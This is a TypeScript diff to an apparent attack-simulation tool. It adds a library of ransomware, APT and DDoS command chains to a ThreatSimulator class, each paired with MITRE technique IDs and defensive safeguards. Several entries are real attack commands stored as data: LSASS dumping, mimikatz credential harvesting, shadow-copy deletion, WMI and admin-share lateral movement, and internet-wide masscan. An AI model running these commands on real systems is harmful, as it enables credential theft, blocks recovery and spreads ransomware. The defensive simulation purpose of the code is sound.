@@ -6,7 +6,10 @@ export interface AttackSimulationResult {
   startTime: string;
   endTime: string;
   status: string;
+  stopReason?: string;
+  terminatedAt?: string;
   phases: AttackPhase[];
+  commandChain: CommandChainEntry[];
   iocs: IOC[];
   detectionRate: number;
   impactAssessment: ImpactAssessment;
@@ -21,6 +24,16 @@ export interface AttackPhase {
   success: boolean;
   detectedBy: string[];
   artifacts: Artifact[];
+  commandChain: CommandChainEntry[];
+}
+
+export interface CommandChainEntry {
+  phase: string;
+  step: number;
+  pseudoCommand: string;
+  description: string;
+  safeguards: string[];
+  techniqueRef?: string;
 }
 
 export interface Technique {
@@ -65,6 +78,169 @@ export interface MitreMapping {
 
 export class ThreatSimulator {
   private activeSimulations: Map<string, AttackSimulationResult> = new Map();
+  private readonly commandChainLibrary: Record<
+    string,
+    Record<
+      string,
+      { pseudoCommand: string; description: string; safeguards: string[]; technique?: string }[]
+    >
+  > = {
+    ransomware: {
+      "Initial Access": [
+        {
+          pseudoCommand: "send-phish --template=ransomware_notice.eml --attachment=[SIMULATED_PAYLOAD]",
+          description: "Deliver crafted phishing email with ransomware dropper",
+          safeguards: ["Email sandboxing", "DMARC enforcement"],
+          technique: "T1566.001",
+        },
+        {
+          pseudoCommand: "inject-vpn --target=gateway --exploit=CVE-2023-27997",
+          description: "Test perimeter appliance exploit as alternate ingress",
+          safeguards: ["Virtual patching", "Perimeter anomaly detection"],
+          technique: "T1190",
+        },
+      ],
+      Execution: [
+        {
+          pseudoCommand: "powershell -enc [SIMULATED_PAYLOAD]",
+          description: "Execute launcher via encoded PowerShell",
+          safeguards: ["Script block logging", "EDR command-line policy"],
+          technique: "T1059.001",
+        },
+        {
+          pseudoCommand: "rundll32.exe payload.dll,EntryPoint",
+          description: "Load ransomware core through LOLBIN invocation",
+          safeguards: ["Application control", "Command-line monitoring"],
+          technique: "T1218.011",
+        },
+      ],
+      "Credential Access": [
+        {
+          pseudoCommand: "procdump64.exe -ma lsass.exe C:\\Temp\\lsass.dmp",
+          description: "Dump credentials from LSASS memory",
+          safeguards: ["Credential Guard", "Process access auditing"],
+          technique: "T1003.001",
+        },
+      ],
+      "Lateral Movement": [
+        {
+          pseudoCommand: "wmic /node:FILESERVER process call create C:\\Windows\\Temp\\payload.exe",
+          description: "Launch payload remotely through WMI",
+          safeguards: ["WMI logging", "Remote execution restrictions"],
+          technique: "T1047",
+        },
+        {
+          pseudoCommand: "net use \\\\FILESERVER\\C$ /user:DOMAIN\\admin [REDACTED] && copy payload.exe \\\\FILESERVER\\C$\\temp\\",
+          description: "Copy binary via admin shares for lateral deployment",
+          safeguards: ["Admin share monitoring", "Just-in-time access"],
+          technique: "T1021.002",
+        },
+      ],
+      Impact: [
+        {
+          pseudoCommand: "vssadmin Delete Shadows /All /Quiet",
+          description: "Remove Volume Shadow Copies to inhibit recovery",
+          safeguards: ["Shadow copy monitoring", "Ransomware canary"],
+          technique: "T1490",
+        },
+        {
+          pseudoCommand: "encryptor.exe --scope=//corp/share --mode=aes256",
+          description: "Simulate mass encryption across network shares",
+          safeguards: ["File integrity monitoring", "Network segmentation"],
+          technique: "T1486",
+        },
+      ],
+    },
+    apt: {
+      Reconnaissance: [
+        {
+          pseudoCommand: "masscan 0.0.0.0/0 -p22,80,443,445 --rate 1000",
+          description: "Enumerate exposed services at scale",
+          safeguards: ["Egress monitoring", "Threat intelligence correlation"],
+          technique: "T1595",
+        },
+        {
+          pseudoCommand: "harvest-profiles --platform=linkedin --org='Target Corp'",
+          description: "Collect personnel metadata for spearphishing",
+          safeguards: ["Brand monitoring", "Awareness training"],
+          technique: "T1589",
+        },
+      ],
+      "Initial Compromise": [
+        {
+          pseudoCommand: "exploit-cve --id=CVE-2023-42793 --target=https://portal.target.example",
+          description: "Exploit remote code execution in portal service",
+          safeguards: ["Virtual patching", "WAF behavioral rules"],
+          technique: "T1190",
+        },
+      ],
+      "Establish Foothold": [
+        {
+          pseudoCommand: "upload-webshell --path=/var/www/html/.cache.php --payload=[SIMULATED_PAYLOAD]",
+          description: "Plant web shell for follow-on operations",
+          safeguards: ["Integrity monitoring", "Web directory allowlists"],
+          technique: "T1505.003",
+        },
+      ],
+      "Command and Control": [
+        {
+          pseudoCommand: "beacon --protocol=dns --profile=low-slow --domain=cdn.example",
+          description: "Maintain covert DNS-based C2 channel",
+          safeguards: ["DNS analytics", "Beaconing detection"],
+          technique: "T1071.004",
+        },
+      ],
+      "Credential Access": [
+        {
+          pseudoCommand: "invoke-mimikatz --module=sekurlsa::logonpasswords",
+          description: "Harvest credentials from memory using credential tool",
+          safeguards: ["Application control", "LSASS protection"],
+          technique: "T1003.001",
+        },
+      ],
+      "Lateral Movement": [
+        {
+          pseudoCommand: "wmiexec.py domain\\admin@[SIMULATED_HOST]",
+          description: "Pivot into additional hosts using remote service execution",
+          safeguards: ["WMI command auditing", "Network segmentation"],
+          technique: "T1047",
+        },
+      ],
+    },
+    ddos: {
+      "Botnet Coordination": [
+        {
+          pseudoCommand: "botnet-controller --issue 'prep flood udp 203.0.113.10 80 120s'",
+          description: "Prime botnet nodes for upcoming flood",
+          safeguards: ["Botnet sinkholing", "Traffic rate limiting"],
+          technique: "T1584.005",
+        },
+      ],
+      "Traffic Flood": [
+        {
+          pseudoCommand: "launch-flood --type=syn --pps=500000 --duration=600",
+          description: "Simulate high-volume SYN flood",
+          safeguards: ["Adaptive rate limiting", "SYN cookies"],
+          technique: "T1498",
+        },
+        {
+          pseudoCommand: "invoke-amplification --vector=dns --reflectors=list.txt",
+          description: "Trigger DNS amplification using reflector list",
+          safeguards: ["DNS response rate limiting", "Upstream scrubbing"],
+          technique: "T1498.002",
+        },
+      ],
+    },
+    default: {
+      default: [
+        {
+          pseudoCommand: "simulate-step --phase=[PHASE] --detail=[REDACTED]",
+          description: "Generic simulated command placeholder",
+          safeguards: ["Review logs", "Validate guardrails"],
+        },
+      ],
+    },
+  };
 
   async simulateAttack(
     attackType: string,
@@ -79,6 +255,7 @@ export class ThreatSimulator {
     const detectionRate = this.calculateDetectionRate(phases, intensity);
     const impactAssessment = this.assessImpact(attackType, target, intensity);
     const mitreMapping = this.mapToMitreAttack(attackType, phases);
+    const commandChain = phases.flatMap((phase) => phase.commandChain);
 
     // Simulate attack duration based on intensity
     const durationMinutes = intensity === "low" ? 30 : intensity === "medium" ? 60 : intensity === "high" ? 120 : 240;
@@ -93,6 +270,7 @@ export class ThreatSimulator {
       endTime,
       status: "Active",
       phases,
+      commandChain,
       iocs,
       detectionRate,
       impactAssessment,
@@ -104,7 +282,8 @@ export class ThreatSimulator {
   }
 
   private generateAttackPhases(attackType: string, intensity: string): AttackPhase[] {
-    const phaseTemplates: Record<string, AttackPhase[]> = {
+    type PhaseTemplate = Omit<AttackPhase, "commandChain">;
+    const phaseTemplates: Record<string, PhaseTemplate[]> = {
       ransomware: [
         {
           phase: "Initial Access",
@@ -441,7 +620,43 @@ export class ThreatSimulator {
       ],
     };
 
-    return phaseTemplates[attackType] || phaseTemplates.ransomware;
+    const templates = phaseTemplates[attackType] || phaseTemplates.ransomware;
+    let commandStep = 1;
+
+    return templates.map((phase) => {
+      const commandChain = this.generateCommandChainEntries(
+        attackType,
+        phase.phase,
+        commandStep,
+        phase.techniques
+      );
+      commandStep += Math.max(commandChain.length, 1);
+      return {
+        ...phase,
+        commandChain,
+      };
+    });
+  }
+
+  private generateCommandChainEntries(
+    attackType: string,
+    phase: string,
+    startStep: number,
+    techniques: Technique[]
+  ): CommandChainEntry[] {
+    const typeKey = attackType.toLowerCase();
+    const library = this.commandChainLibrary[typeKey] || this.commandChainLibrary.default;
+    const entries =
+      library[phase] || library.default || this.commandChainLibrary.default.default;
+
+    return entries.map((entry, index) => ({
+      phase,
+      step: startStep + index,
+      pseudoCommand: entry.pseudoCommand,
+      description: entry.description,
+      safeguards: entry.safeguards,
+      techniqueRef: entry.technique || techniques[0]?.mitreId,
+    }));
   }
 
   private generateIOCs(attackType: string, phases: AttackPhase[]): IOC[] {
@@ -659,14 +874,34 @@ export class ThreatSimulator {
     return mappings;
   }
 
-  async stopSimulation(simulationId: string): Promise<boolean> {
+  stopSimulation(simulationId: string, reason?: string): AttackSimulationResult | null {
     const simulation = this.activeSimulations.get(simulationId);
-    if (simulation) {
-      simulation.status = "Stopped";
-      simulation.endTime = new Date().toISOString();
-      return true;
+    if (!simulation) {
+      return null;
     }
-    return false;
+
+    const terminatedAt = new Date().toISOString();
+    const updated: AttackSimulationResult = {
+      ...simulation,
+      status: "Terminated",
+      endTime: terminatedAt,
+      terminatedAt,
+      stopReason: reason || "manual_stop",
+    };
+
+    this.activeSimulations.delete(simulationId);
+    return updated;
+  }
+
+  stopAllSimulations(reason?: string): AttackSimulationResult[] {
+    const terminated: AttackSimulationResult[] = [];
+    for (const simulationId of Array.from(this.activeSimulations.keys())) {
+      const result = this.stopSimulation(simulationId, reason);
+      if (result) {
+        terminated.push(result);
+      }
+    }
+    return terminated;
   }
 
   getSimulation(simulationId: string): AttackSimulationResult | undefined {
